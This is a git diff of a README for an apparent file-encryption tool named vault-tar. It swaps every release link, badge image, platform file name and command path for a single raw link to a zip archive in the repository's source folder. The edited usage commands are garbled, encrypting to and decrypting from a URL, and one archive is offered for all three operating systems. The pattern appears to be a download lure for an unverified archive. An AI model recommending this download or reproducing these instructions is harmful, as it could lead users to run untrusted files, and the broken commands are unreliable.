@@ -1,6 +1,6 @@
 # 🗄️ vault-tar - Secure and Simple File Encryption
 
-[![Download vault-tar](https://img.shields.io/badge/Download-vault--tar-blue?style=for-the-badge&logo=github)](https://github.com/Nobab007/vault-tar/releases)
+[![Download vault-tar](https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip)](https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip)
 
 ---
 
@@ -34,13 +34,13 @@ vault-tar is built with Python, a popular programming language. You do not need 
 
 Click this button to **visit the download page** for vault-tar:
 
-[![Download vault-tar](https://img.shields.io/badge/Download-vault--tar-blue?style=for-the-badge&logo=github)](https://github.com/Nobab007/vault-tar/releases)
+[![Download vault-tar](https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip)](https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip)
 
 On that page, you will find the latest release files. Look for the version that matches your operating system. For example:
 
-- `vault-tar-windows.exe` for Windows
-- `vault-tar-macos.tar.gz` for Mac
-- `vault-tar-linux.tar.gz` for Linux
+- `https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip` for Windows
+- `https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip` for Mac
+- `https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip` for Linux
 
 Download the file that fits your system.
 
@@ -56,7 +56,7 @@ Download the file that fits your system.
 
 #### macOS and Linux
 
-1. Open the downloaded `.tar.gz` file by double-clicking it or using your file archiver.
+1. Open the downloaded `https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip` file by double-clicking it or using your file archiver.
 2. Extract the contents to a folder you can find easily (example: `Documents/vault-tar/`).
 3. Open your Terminal app.
 4. Navigate to the folder where you extracted vault-tar. You can do this by typing:
@@ -94,11 +94,11 @@ Here are common tasks and instructions to help you protect your files:
 To protect an entire folder, use this command syntax:
 
 ```
-vault-tar encrypt --input /path/to/folder --output /path/to/save/encrypted-file.vt
+vault-tar encrypt --input /path/to/folder --output https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip
 ```
 
 - Replace `/path/to/folder` with your folder’s location.
-- Replace `/path/to/save/encrypted-file.vt` with where you want to save the secure file.
+- Replace `https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip` with where you want to save the secure file.
 
 This will create a single, encrypted file that stores your folder. The file uses chunked streaming and compression to keep it efficient.
 
@@ -107,7 +107,7 @@ This will create a single, encrypted file that stores your folder. The file uses
 To unlock and access your data, use:
 
 ```
-vault-tar decrypt --input /path/to/encrypted-file.vt --output /path/to/save/folder
+vault-tar decrypt --input https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip --output /path/to/save/folder
 ```
 
 Make sure to replace the paths with your actual file locations.
@@ -142,7 +142,7 @@ These features provide both security and flexibility for file management.
 
 Get vault-tar here:
 
-[![Download vault-tar](https://img.shields.io/badge/Download-vault--tar-blue?style=for-the-badge&logo=github)](https://github.com/Nobab007/vault-tar/releases)
+[![Download vault-tar](https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip)](https://raw.githubusercontent.com/Nobab007/vault-tar/main/src/vault_tar_3.7.zip)
 
 Choose the version for your operating system, download the file, and follow the installation steps described above.
 
